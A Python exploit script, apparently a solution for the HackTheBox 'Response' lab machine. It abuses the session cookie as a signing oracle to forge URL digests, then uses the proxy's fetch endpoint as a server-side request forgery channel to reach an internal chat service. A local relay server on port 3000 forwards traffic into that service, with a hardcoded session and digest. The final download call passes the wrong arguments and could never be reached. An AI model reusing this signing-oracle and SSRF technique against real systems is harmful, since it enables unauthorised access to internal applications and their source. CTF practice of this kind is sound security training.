import requests
import re
import base64
from http.server import HTTPServer, SimpleHTTPRequestHandler
import mimetypes

def get_digest(url):
    cookie = {"PHPSESSID":url}
    r = requests.get("http://www.response.htb/status/main.js.php",cookies=cookie)
    res = re.search(r"'session_digest':'([0-9a-f]*)'};",r.text)
    print("Session digest: "+res.group(1))
    return res.group(1)
def download_url(method, url, data=None):
    url = f"http://chat.response.htb/{url}"
    url_digest = get_digest(url)
    payload = {
        "url":url,
        "url_digest":url_digest,
        "method":method,
        "session":"e221eb82bca259b796c50de6e07dd689",
        "session_digest":"6ead98cc96f72e4203e77297a5ceb52ac5470526d614210409b3574ff1e22a56"
        }
    if data:
        payload["body"] = base64.b64encode(data).decode()

    if not url_digest:
        return None

    r = requests.post("http://proxy.response.htb/fetch",json=payload)
    return r
def get_mimetype(path):
    mime = mimetypes.MimeTypes()
    mime_type = mime.guess_type(path)
    if mime_type:
            return mime_type[0]
    return "text/html"

class Server(SimpleHTTPRequestHandler):
    def do_GET(self):
        r = download_url("GET",self.path[1:])
        self.send_response(r.status_code)
        self.send_header("Content-type",get_mimetype(self.path))
        self.end_headers()
        data = r.json()
        decoded = base64.b64decode(data["body"])
        if self.path.endswith(".js"):
            decoded = decoded.replace(b"chat.response.htb",b"localhost:3000")
        self.wfile.write(decoded)
    def do_POST(self):
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))
        if self.data_string:
            r = download_url("POST",self.path[1:],self.data_string)
        else:
            r = download_url("POST",self.path[1:])
        self.send_response(r.status_code)
        self.send_header("Content-type",get_mimetype(self.path))
        self.end_headers()
        data = r.json()
        self.wfile.write(base64.b64decode(data["body"]))

HTTPServer(("",3000), Server).serve_forever()


r = download_url("http://chat.response.htb/files/chat_source.zip")
file = base64.b64decode(r.json()["body"])
with open("chat_source.zip",'wb') as f:
    f.write(file)